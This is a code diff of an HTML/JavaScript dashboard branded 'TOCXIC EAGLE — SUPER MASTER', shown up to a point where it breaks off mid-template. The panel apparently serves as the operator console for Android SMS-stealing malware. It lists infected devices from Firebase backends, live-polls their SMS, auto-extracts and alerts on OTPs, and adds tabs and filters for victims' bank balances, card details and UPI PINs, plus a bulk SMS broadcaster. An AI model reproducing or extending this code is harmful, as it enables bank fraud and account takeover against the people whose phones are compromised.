-<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — SUPER MASTER</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="theme-color" content="#0F3CC9">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">SUPER MASTER 👑</span></div></div>
-<div class="nav">
-<a href="/admin/dashboard" class="nav-link active">📱 Numbers</a>
-<a href="/firebases" class="nav-link">🔥 Firebases</a>
-<a href="/admin/security" class="nav-link sec">🔒 Security</a>
-</div>
-<div style="display:flex;align-items:center;gap:10px">
-<button onclick="manualRefresh()" style="background:var(--grad);color:#fff;border:none;
-width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
-<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<button id="top-num-btn" onclick="showTopNum()" style="display:none; background:linear-gradient(135deg,#fbbf24,#f59e0b); color:#fff; border:none; width:42px; height:42px; border-radius:50%; font-size:18px; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(251,191,36,0.4);">📞</button>
-<a href="/logout" class="nav-link">Logout</a>
-</div>
-</div>
-
-<div class="container">
-<div id="list-view">
-<div class="stats">
-<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
-<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick">
-<div class="info">🔥 Firebases <b id="q-fb">0</b> · 📱 Numbers <b id="q-dev">0</b></div>
-<div class="btns">
-<button class="green" onclick="manualRefresh()">🔄 Refresh</button>
-<button class="amber" onclick="openBcModal()">📧 Broadcast</button>
-<a href="/firebases">⚙️ Manage</a>
-</div>
-</div>
-<div class="num-filter-bar">
-<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
-<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
-<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
-</div>
-<div id="loading-text" class="loading-text">
-<span class="spinner"></span><span id="loading-msg">Loading...</span>
-<div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
-</div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
-<div class="list-header">
-<h2>📱 Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2>
-<span class="count" id="num-count">0</span>
-</div>
-<div id="num-list"></div>
-</div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top">
-<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
-<div style="flex:1">
-<div class="inbox-num" id="inbox-num">+91 ------</div>
-<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
-</div>
-</div>
-<div class="inbox-meta">
-<span>⚡ LIVE · auto 1s · Latest 10 SMS</span>
-<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
-</div>
-<div class="mail-tab-bar" style="margin-top:14px">
-<button class="mail-tab-btn active" id="mt-sms" onclick="setMailTab('sms')">🛜 SMS</button>
-<button class="mail-tab-btn" id="mt-mail" onclick="setMailTab('mail')">📧 Broadcast Mail</button>
-</div>
-<div class="filter-bar">
-<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
-<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
-<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<!-- 📧 SINGLE FAB -->
-<button class="bc-fab" onclick="openBcModal()" title="Broadcast Mail">
-  📧<span class="badge-count" id="bc-fab-badge" style="display:none">0</span>
-</button>
-
-<!-- 📧 BROADCAST MODAL -->
-<div class="bc-modal" id="bc-modal" onclick="if(event.target===this)closeBcModal()">
+<div class="bc-modal" id="broadcast-modal" onclick="if(event.target===this)closeBroadcastModal()">
   <div class="bc-box">
     <div class="bc-head">
       <div class="bc-icon">📧</div>
-      <div style="flex:1;min-width:0">
+      <div class="flex1 min0">
         <div class="bc-title">BROADCAST MAIL</div>
         <div class="bc-sub" id="bc-subtitle">send to multiple devices</div>
       </div>
-      <button class="close-btn" onclick="closeBcModal()">✕</button>
+      <button class="btn-icon" onclick="closeBroadcastModal()">✕</button>
     </div>
     <div class="bc-body">
       <div class="bc-target-stats">
@@ -2178,1174 +1124,870 @@ width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
         <div class="bc-ts online"><div class="n" id="bc-online">0</div><div class="l">📡 Online</div></div>
         <div class="bc-ts offline"><div class="n" id="bc-offline">0</div><div class="l">⚠️ Offline</div></div>
       </div>
-      <div class="bc-label">Target Mode</div>
+      <div class="section-label">Target Mode</div>
       <div class="bc-modes">
-        <div class="bc-mode active" id="tm-all" onclick="pickBcMode('all')">ALL</div>
-        <div class="bc-mode" id="tm-online" onclick="pickBcMode('online')">📡 ONLINE</div>
-        <div class="bc-mode" id="tm-offline" onclick="pickBcMode('offline')">⚠️ OFFLINE</div>
-        <div class="bc-mode" id="tm-manual" onclick="pickBcMode('manual')">✋ MANUAL</div>
+        <div class="bc-mode active" id="tm-all" onclick="pickTargetMode('all')">ALL</div>
+        <div class="bc-mode" id="tm-online" onclick="pickTargetMode('online')">📡 ONLINE</div>
+        <div class="bc-mode" id="tm-offline" onclick="pickTargetMode('offline')">⚠️ OFFLINE</div>
+        <div class="bc-mode" id="tm-manual" onclick="pickTargetMode('manual')">✋ MANUAL</div>
       </div>
-      <div class="bc-label">Devices <span class="hint" id="bc-selected-count">(0 selected)</span></div>
-      <div class="bc-dev-list" id="bc-dev-list"></div>
-      <div class="bc-label">Mail Body</div>
+      <div class="section-label">
+        <span>Devices <span id="bc-selected-count" style="color:var(--amber)">(0 selected)</span></span>
+        <span id="bc-msg-info" style="font-size:9px;color:var(--text3);letter-spacing:0;font-weight:600">1 mail per device</span>
+      </div>
+      <div class="bc-dev-list" id="bc-device-list"></div>
+      <div class="section-label">Mail Body</div>
       <div class="bc-templates">
         <div class="bc-chip" onclick="applyBcTemplate('alert')">⚠️ Alert</div>
         <div class="bc-chip" onclick="applyBcTemplate('maint')">🔧 Maintenance</div>
         <div class="bc-chip" onclick="applyBcTemplate('welcome')">👋 Welcome</div>
         <div class="bc-chip" onclick="applyBcTemplate('blank')">🗑 Clear</div>
       </div>
-      <textarea class="bc-textarea" id="bc-body" placeholder="Type your broadcast mail…"
-        oninput="updateBcCounter()" rows="4"></textarea>
+      <textarea class="inp" id="bc-body" placeholder="Type your broadcast mail…"
+                oninput="updateBcCounter()" rows="4" style="min-height:100px"></textarea>
       <div class="bc-counter" id="bc-counter">
         <span id="bc-segments">1 SMS · GSM-7</span>
         <span id="bc-chars">0 / 160</span>
       </div>
       <div class="bc-progress" id="bc-progress">
         <div class="bc-progress-bar"><div class="bc-progress-fill" id="bc-progress-fill"></div></div>
-        <div class="bc-progress-text" id="bc-progress-text">Sending…</div>
+        <div class="bc-progress-text" id="bc-progress-text">Preparing…</div>
       </div>
       <div class="bc-actions">
-        <button class="btn-ghost" onclick="closeBcModal()">Cancel</button>
-        <button class="btn-bc" id="bc-send-btn" onclick="doBroadcast()">📧 Send Mail</button>
+        <button class="btn btn-ghost" onclick="closeBroadcastModal()">Cancel</button>
+        <button class="btn-bc" id="bc-send-btn" onclick="doBroadcast()">📧 Send Mail to All</button>
       </div>
     </div>
   </div>
 </div>
 
-<div id="toast" class="toast"></div>
+<div class="drawer-overlay" id="drawer" onclick="if(event.target===this)closeDrawer()">
+  <div class="drawer">
+    <div class="drawer-header">
+      <div class="drawer-icon">📱</div>
+      <div class="flex1 min0">
+        <div class="drawer-title" id="drawer-title">Device</div>
+        <div class="drawer-id" id="drawer-id"></div>
+      </div>
+      <button class="btn-icon" onclick="closeDrawer()">✕</button>
+    </div>
+    <div class="drawer-status" id="drawer-status"></div>
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('info',this)">Info</div>
+      <div class="tab" id="tab-bank" onclick="switchTab('bank',this)">Bank</div>
+      <div class="tab" id="tab-card" onclick="switchTab('card',this)">Card</div>
+      <div class="tab" onclick="switchTab('sms',this)"><span class="tab-emoji">🛜</span>SMS</div>
+      <div class="tab" id="tab-mail" onclick="switchTab('mail',this)"><span class="tab-emoji">📧</span>Mail</div>
+    </div>
+    <div class="drawer-body">
+      <div id="panel-info"></div>
+      <div id="panel-bank" style="display:none"></div>
+      <div id="panel-card" style="display:none"></div>
+      <div id="panel-sms" style="display:none"></div>
+      <div id="panel-mail" style="display:none"></div>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
 
 <script>
-let allNumbers = [], numbers = [], currentNum = null;
-let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
-let currentFilter = 'recent', currentNumberFilter = 'all', currentMailTab = 'sms';
-let lastOtpSeen = '', notifAsked = false;
-let currentTopNumber = null;
-let allBroadcasts = [];
+const IS_ADMIN = {IS_ADMIN};
 
-// broadcast state
-let bcTargetMode = 'all';
-let bcManualSelected = new Set();
-let bcTargets = [];
+const $ = (s) => document.querySelector(s);
+const $$ = (s) => document.querySelectorAll(s);
+let devices = [], currentFilter = "all", currentSort = "new", openDev = null;
+let smsCache = {}, smsAnalysisCache = {};
+let bcTargetMode = "all", bcManualSelected = new Set(), bcTargets = [];
+let allBroadcastsForDevice = [], currentMailTab = "sms";
 
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }
-
-function playSound(){ try{
-const ctx = new (window.AudioContext||window.webkitAudioContext)();
-[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
-o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
-const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
-g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }
-
-function askNotif(){ if(notifAsked) return; notifAsked = true;
-if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }
-
-function showOtpNotif(otp, from, msg){
-toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
-if('Notification' in window && Notification.permission === 'granted'){
-try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
-setTimeout(()=>n.close(), 10000); }catch(e){} }
-if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }
-
-async function manualRefresh(){ toast('🔄 Refreshing...');
-try{ const r = await fetch('/api/refresh',{method:'POST'}); const d = await r.json();
-if(d.success){ setTimeout(loadNumbers, 800); toast('✅ Triggered'); }
-else toast('❌ ' + (d.error||'Failed')); } catch(e){ toast('❌ Network error'); } }
-
-function setNumberFilter(f){ currentNumberFilter = f;
-document.getElementById('nf-all').classList.toggle('active', f==='all');
-document.getElementById('nf-online').classList.toggle('active', f==='online');
-document.getElementById('nf-offline').classList.toggle('active', f==='offline');
-applyFilter(); renderNumbers(); }
-
-function setFilter(f){ currentFilter = f;
-document.getElementById('fb-10m').classList.toggle('active', f==='10m');
-document.getElementById('fb-recent').classList.toggle('active', f==='recent');
-document.getElementById('fb-all').classList.toggle('active', f==='all');
-renderMessages(); }
-
-function setMailTab(t){
-  currentMailTab = t;
-  document.getElementById('mt-sms').classList.toggle('active', t==='sms');
-  document.getElementById('mt-mail').classList.toggle('active', t==='mail');
-  if(t === 'mail'){ loadBroadcasts(currentNum); }
-  renderMessages();
+function showToast(msg, dur = 3000) {
+  const t = $("#toast"); if (!t) return;
+  t.textContent = msg; t.classList.add("show");
+  clearTimeout(window._t); window._t = setTimeout(() => t.classList.remove("show"), dur);
 }
 
-function applyFilter(){
-if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-else numbers = allNumbers.slice();
-document.getElementById('num-count').textContent = numbers.length; }
+setInterval(() => {
+  const c = $("#clock"); if (!c) return;
+  c.textContent = new Date().toLocaleTimeString("en-US", { hour:"2-digit", minute:"2-digit", hour12:false });
+}, 1000);
 
-async function checkConn(){
-try{ const r = await fetch('/api/conn'); const d = await r.json();
-const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
-if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
-else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }
-
-async function loadNumbers(){
-try{ const r = await fetch('/api/numbers'); const d = await r.json();
-if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
-allNumbers = d.numbers || [];
-document.getElementById('s-total').textContent = d.total;
-document.getElementById('s-online').textContent = d.online;
-document.getElementById('s-offline').textContent = d.offline;
-document.getElementById('s-otp').textContent = d.otp_rate + '%';
-document.getElementById('q-dev').textContent = allNumbers.length;
-document.getElementById('q-fb').textContent = d.firebases_total || 0;
-document.getElementById('nf-all-c').textContent = allNumbers.length;
-document.getElementById('nf-online-c').textContent = d.online || 0;
-document.getElementById('nf-offline-c').textContent = d.offline || 0;
-if(d.progress){ const pct = d.progress.total > 0 ? Math.floor(d.progress.done/d.progress.total*100) : 0;
-document.getElementById('prog-fill').style.width = pct + '%';
-document.getElementById('loading-msg').textContent = 'Fetching ' + d.progress.done + '/' + d.progress.total + ' (' + pct + '%)...'; }
-applyFilter();
-if(allNumbers.length > 0){
-document.getElementById('loading-text').classList.add('hidden');
-document.getElementById('list-content').classList.remove('hidden');
-const sig = allNumbers.length + '|' + d.online + '|' + currentNumberFilter;
-if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
-else { document.getElementById('loading-text').classList.remove('hidden');
-document.getElementById('loading-msg').textContent = d.loading ? '⏳ Loading...' : '📭 No numbers'; }
-updateBcBadge();
-}catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }
-
-function updateBcBadge(){
-  const b = document.getElementById('bc-fab-badge');
-  if(!b) return;
-  if(allNumbers.length > 0){ b.style.display = 'flex'; b.textContent = allNumbers.length; }
-  else b.style.display = 'none';
+/* ═══ BOOT ═══ */
+async function boot() {
+  connectStream();
+  await loadDevices();
+  updateBcCountBadge();
+  setInterval(checkConn, 8000);
+  setInterval(() => { if (!openDev) loadDevices(); }, 5000);
 }
 
-function renderNumbers(){
-const q = (document.getElementById('search-num').value || '').toLowerCase();
-const box = document.getElementById('num-list');
-const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
-(n.device_name||'').toLowerCase().includes(q) || (n.fb_name||'').toLowerCase().includes(q));
-if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers found</div>'; return; }
-box.innerHTML = filtered.map(n => {
-const isOn = n.online === true;
-const isUnk = (n.number||'').startsWith('UNKNOWN-');
-const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
-const badgeCls = isOn ? 'badge-online' : 'badge-offline';
-const badgeTxt = isOn ? 'Online' : 'Offline';
-const cardCls = isOn ? '' : 'offline';
-const titleCls = isUnk ? 'unknown' : '';
-const conf = n.confidence || 0;
-let confB = '';
-if(!isUnk && conf > 0) confB = '<span class="confidence-badge">✓ ' + conf + 'x</span>';
-const idx = numbers.indexOf(n);
-return '<div class="num-card ' + cardCls + '">' +
-'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
-'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
-'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + ' ' + confB + '</div>' +
-'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
-(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
-'<div class="card-actions"><button class="raw-btn" onclick="event.stopPropagation();openRawData(' + idx + ')" title="Raw Data">🔍</button></div>' +
-'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
-'<div class="arrow">›</div></div>'; }).join(''); }
-
-function openRawData(idx){ if(idx < 0 || idx >= numbers.length) return;
-const n = numbers[idx];
-const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
-window.open(url, '_blank'); }
-
-function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-currentNum = n; lastInboxSig = ''; allInboxMsgs = []; allBroadcasts = [];
-currentFilter = 'recent'; lastOtpSeen = ''; currentMailTab = 'sms';
-currentTopNumber = null; updateTopBadge([]);
-askNotif();
-document.getElementById('fb-10m').classList.remove('active');
-document.getElementById('fb-recent').classList.add('active');
-document.getElementById('fb-all').classList.remove('active');
-document.getElementById('mt-sms').classList.add('active');
-document.getElementById('mt-mail').classList.remove('active');
-document.getElementById('list-view').classList.add('hidden');
-document.getElementById('inbox-view').classList.remove('hidden');
-document.getElementById('inbox-num').textContent = n.number;
-const statusEl = document.getElementById('inbox-status');
-const statusTxt = document.getElementById('inbox-status-text');
-if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-await Promise.all([ loadInbox(false), loadBroadcasts(n) ]);
-if(refreshTimer) clearInterval(refreshTimer);
-refreshTimer = setInterval(()=>{ if(currentMailTab === 'sms') loadInbox(false); }, 1500);
+/* ═══ SSE ═══ */
+let es = null;
+function connectStream() {
+  if (es) es.close();
+  try { es = new EventSource("/api/stream"); } catch(e) { return; }
+  es.addEventListener("hello", () => setConn(true));
+  es.addEventListener("devices_added", () => { loadDevices(); });
+  es.addEventListener("devices_updated", () => { loadDevices(); if (openDev) renderDrawerStatus(); });
+  es.addEventListener("devices_removed", () => { loadDevices(); });
+  es.addEventListener("error", () => setConn(false));
+  es.onerror = () => setConn(false);
 }
 
-async function loadBroadcasts(n){
-  if(!n) return;
-  try{
-    const r = await fetch('/api/broadcasts/inbox?device_id=' + encodeURIComponent(n.device_id) +
-                          '&fb=' + encodeURIComponent(n.firebase) +
-                          '&num=' + encodeURIComponent(n.number));
+function setConn(ok) {
+  const dot = $("#conn-dot"), txt = $("#conn-txt"); if (!dot) return;
+  dot.className = "dot " + (ok ? "dot-green" : "dot-red");
+  txt.textContent = ok ? "Live" : "Offline";
+}
+async function checkConn() {
+  try { const r = await fetch("/api/conn"); const d = await r.json(); setConn(d.mongo_connected); }
+  catch(e) { setConn(false); }
+}
+
+/* ═══ NORMALIZE ═══ */
+function normalize(d) {
+  const slug = d._slug || d.slug || "unknown";
+  const rawId = d.id || d.device_id;
+  const composite = `${slug}::${rawId}`;
+  const sims = Array.isArray(d.sims) ? d.sims : (d.sims ? Object.values(d.sims) : []);
+  const bat = String(d.battery ?? "0");
+  const batPct = parseInt(bat.replace("%", "")) || 0;
+  const rawTs = d.lastSeen ?? d.last_seen ?? d.lastOnline ?? d.last_active ?? d.timestamp ?? d.time ?? null;
+  let lastSeen = null;
+  if (rawTs) {
+    const n = typeof rawTs === "number" ? (rawTs < 1e12 ? rawTs * 1000 : rawTs) : Date.parse(String(rawTs));
+    if (!isNaN(n)) lastSeen = n;
+  }
+  return {
+    id: composite, rawId, slug,
+    name: String(d.modelName || d.model || d.deviceName || d.device_name || rawId || "unknown"),
+    battery: bat, batteryPercent: batPct, status: !!d.status || !!d.online,
+    phoneNumber: String(d.mobNo || d.mobile || d.number || (sims[0]?.phoneNumber || sims[0]?.number) || "—"),
+    android: String(d.androidV || d.androidVersion || "—"),
+    ip: String(d.ip_address || d.ip || "—"),
+    storage: String(d.storage || "—"),
+    provider: String(d.service_provider || d.provider || "—"),
+    sims, upipin: d.upipin ? String(d.upipin) : null,
+    cpu: String(d.cpu_arch || "—"), sdk: String(d.sdkV || "—"),
+    lastSeen,
+    device_id: d.device_id || rawId,
+    firebase: d.firebase || "",
+    fb_name: d.fb_name || "",
+  };
+}
+
+async function loadDevices() {
+  try {
+    const r = await fetch("/api/numbers");
     const d = await r.json();
-    if(d.success){ allBroadcasts = d.broadcasts || [];
-      if(currentMailTab === 'mail') renderMessages(); }
-  }catch(e){}
+    const arr = (d.numbers || []).map(normalize);
+    devices = arr;
+    updateStats(); renderGrid();
+    updateBcCountBadge();
+  } catch(e) {
+    $("#device-grid").innerHTML = `<div class="empty"><span class="empty-icon">⚠️</span>${escHtml(e.message)}</div>`;
+  }
 }
 
-function findTop(msgs){ const counter = {}, senders = new Set();
-msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
-msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
-if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
-counter[n] = (counter[n]||0) + 1; } });
-let top = null, cnt = 0;
-for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
-return top ? {number: top, count: cnt} : null; }
-
-function updateTopBadge(msgs){
-const btn = document.getElementById('top-num-btn');
-if(!btn) return;
-const t = findTop(msgs);
-if(t && t.count >= 2){ currentTopNumber = t.number; btn.style.display = 'inline-flex'; }
-else { currentTopNumber = null; btn.style.display = 'none'; }
+/* ═══ STATS ═══ */
+function updateStats() {
+  $("#stat-total").textContent = devices.length;
+  $("#stat-online").textContent = devices.filter(d => d.status).length;
+  $("#stat-offline").textContent = devices.filter(d => !d.status).length;
+  $("#stat-bank").textContent = devices.filter(d => d.smsAnalysis?.bankBalances?.length).length;
+  $("#stat-card").textContent = devices.filter(d => d.smsAnalysis?.cards?.length).length;
+  // mail stat = count of broadcasts for this browser's device set (simplified)
+  let mailCount = 0;
+  try {
+    const seen = new Set();
+    devices.forEach(d => { if (d.broadcast_count) mailCount += d.broadcast_count; });
+  } catch(e) {}
+  $("#stat-mail").textContent = mailCount || 0;
 }
 
-function showTopNum(){
-if(currentTopNumber){
-toast('📞 Top Number: ' + currentTopNumber);
-if(navigator.clipboard) navigator.clipboard.writeText(currentTopNumber);
-} else { toast('❌ Koi frequent number nahi mila'); }
-}
+/* ═══ FILTERS / SORT ═══ */
+window.setFilter = (f, el) => {
+  currentFilter = f;
+  $$(".filter-btn").forEach(b => b.classList.remove("active","active-green","active-purple"));
+  if (f === "bank") el.classList.add("active-green");
+  else if (f === "card") el.classList.add("active-purple");
+  else el.classList.add("active");
+  renderGrid();
+};
+window.setSort = (v) => { currentSort = v; renderGrid(); };
 
-async function loadInbox(showLoader){
-if(!currentNum) return;
-if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
-const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
-try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
-'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
-{ signal: c.signal }); clearTimeout(tid);
-const d = await r.json();
-if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
-const msgs = d.messages || []; allInboxMsgs = msgs;
-if(msgs.length > 0){ const newest = msgs[0];
-const otp = newest.otp || extractOtp(newest.message);
-const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
-if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
-const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-if(sig !== lastInboxSig){ lastInboxSig = sig; if(currentMailTab === 'sms') renderMessages(); }
-}catch(e){ clearTimeout(tid); } }
-
-function timeAgo(ts, now){
-if(!ts) return ''; const d = now - ts;
-if(d < 10) return 'अभी'; if(d < 60) return d + 's';
-if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
-return Math.floor(d/86400) + 'd'; }
-
-function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }
-
-function renderMessages(){
-const box = document.getElementById('sms-container');
-const now = Math.floor(Date.now()/1000);
-
-if(currentMailTab === 'mail'){
-  if(!allBroadcasts.length){
-    box.innerHTML = '<div class="empty">📭 No broadcast mail sent yet</div>';
+window.renderGrid = function () {
+  const q = ($("#search-inp")?.value || "").toLowerCase();
+  let filtered = devices.filter(d => {
+    if (currentFilter === "online" && !d.status) return false;
+    if (currentFilter === "offline" && d.status) return false;
+    if (currentFilter === "bank" && !d.smsAnalysis?.bankBalances?.length) return false;
+    if (currentFilter === "card" && !d.smsAnalysis?.cards?.length) return false;
+    if (currentFilter === "upi" && !d.upipin) return false;
+    if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
+    return true;
+  });
+  filtered.sort((a, b) => {
+    if (currentSort === "name") return a.name.localeCompare(b.name);
+    if (currentSort === "battery") return b.batteryPercent - a.batteryPercent;
+    if (currentSort === "old") return a.id.localeCompare(b.id);
+    return b.id.localeCompare(a.id);
+  });
+  const grid = $("#device-grid");
+  if (!filtered.length) {
+    grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No devices</div>';
     return;
   }
-  let list = [...allBroadcasts].sort((a,b) => (b.created_at||0) - (a.created_at||0)).slice(0, 50);
-  box.innerHTML = '<div class="sms-list">' + list.map(b => {
-    const isFresh = (b.created_at||0) >= now - 120;
-    const timeStr = fmtTime(b.created_at);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const statusColor = b.status === 'delivered' ? '#12b76a' : (b.status === 'failed' ? '#E40000' : '#f59e0b');
-    return '<div class="sms-item mail-item ' + (isFresh?'fresh':'') + '">' +
-      '<div class="msg-type-badge mail">📧 MAIL</div>' +
-      '<div class="sms-head"><div class="sender mail-sender">📧 ADMIN BROADCAST ' + newBadge + '</div>' +
-      '<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-      '<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(b.created_at, now) + '</div></div></div>' +
-      '<div class="sms-body">' + escapeHtml(b.message || '') + '</div>' +
-      '<div style="margin-top:8px;font-size:10px;font-weight:800;color:' + statusColor + ';font-family:Orbitron,sans-serif;letter-spacing:.5px;text-transform:uppercase">' +
-      '● ' + (b.status || 'sent') + ' → ' + escapeHtml(b.number || '') + '</div></div>';
-  }).join('') + '</div>';
-  return;
+  grid.innerHTML = filtered.map(cardHtml).join("");
+};
+
+function cardHtml(d) {
+  const an = d.smsAnalysis;
+  const topBank = an?.bankBalances?.[0], topCard = an?.cards?.[0];
+  const phone = d.phoneNumber !== "—" ? d.phoneNumber : an?.phoneNumbers?.[0] || "—";
+  const net = d.provider !== "—" ? d.provider : an?.networks?.[0] || null;
+  const statusPill = d.status
+    ? '<span class="status-emoji online"><span class="emoji">📡</span>ONLINE</span>'
+    : '<span class="status-emoji offline"><span class="emoji">⚠️</span>OFFLINE</span>';
+  return `<div class="device-card" onclick="openDevice('${d.id}')">
+    <div class="flex items-center" style="gap:10px;margin-bottom:10px">
+      <div class="device-icon-tile ${d.status ? "" : "offline"}">📱</div>
+      <div class="flex1 min0">
+        <div class="dev-name">${escHtml(d.name)}</div>
+        <div class="dev-id">${escHtml(d.slug)} · ${escHtml(d.rawId)}</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
+      <div>
+        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Android</div>
+        <div style="font-size:13px;font-weight:700">${d.android !== "—" ? "v" + d.android.replace("v","") : "—"}</div>
+      </div>
+      <div>
+        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Battery</div>
+        ${batHtml(d.batteryPercent)}
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
+      <div>
+        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Number</div>
+        <div style="font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text2)">${escHtml(phone)}</div>
+      </div>
+      ${net ? `<div>
+        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Network</div>
+        <div style="font-size:12px;font-weight:600">${escHtml(net)}</div>
+      </div>` : "<div></div>"}
+    </div>
+    ${topBank ? `<div style="background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);border-radius:var(--radius);padding:8px 10px;margin-bottom:8px">
+      <div class="flex items-center justify-between">
+        <span style="font-size:10px;font-weight:700;color:var(--green)">${escHtml(topBank.bankName)}${topBank.accountLast4 ? ` ••${escHtml(topBank.accountLast4)}` : ""}</span>
